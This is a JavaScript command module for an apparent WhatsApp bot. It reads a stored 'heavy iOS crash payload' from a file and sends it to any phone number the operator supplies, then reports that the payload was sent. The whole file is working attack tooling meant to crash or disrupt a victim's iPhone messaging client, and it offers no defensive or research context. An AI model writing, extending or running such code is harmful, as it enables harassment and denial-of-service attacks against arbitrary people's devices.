import fs from "fs";
import path from "path";

export default {
  name: "horla-heavy-ios-crash",
  description: "Send the very heavy iOS crash payload to a number",
  async execute(msg, { sock, args }) {
    try {
      if (!args[0]) {
        return await sock.sendMessage(msg.key.remoteJid, {
          text: "⚠️ Usage: #horla-heavy-ios-crash <number>\nExample: 2348123456789"
        });
      }

      // Construct path to heavy crash payload
      const filePath = path.join(process.cwd(), "bugs", "max_ios_crash_heavy.txt");
      if (!fs.existsSync(filePath)) {
        return await sock.sendMessage(msg.key.remoteJid, {
          text: "❌ Payload file not found. Run `node make_max_ios_crash_heavy.js` first."
        });
      }

      // Format the target number
      let target = args[0];
      if (!target.includes("@s.whatsapp.net")) {
        if (target.length < 10) {
          return await sock.sendMessage(msg.key.remoteJid, {
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX"
          });
        }
        target = target + "@s.whatsapp.net";
      }

      // Read payload and send
      const payload = fs.readFileSync(filePath, "utf8");
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ Heavy iOS crash payload sent to ${args[0]}`
      });

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send payload: " + e.message
      });
    }
  }
};
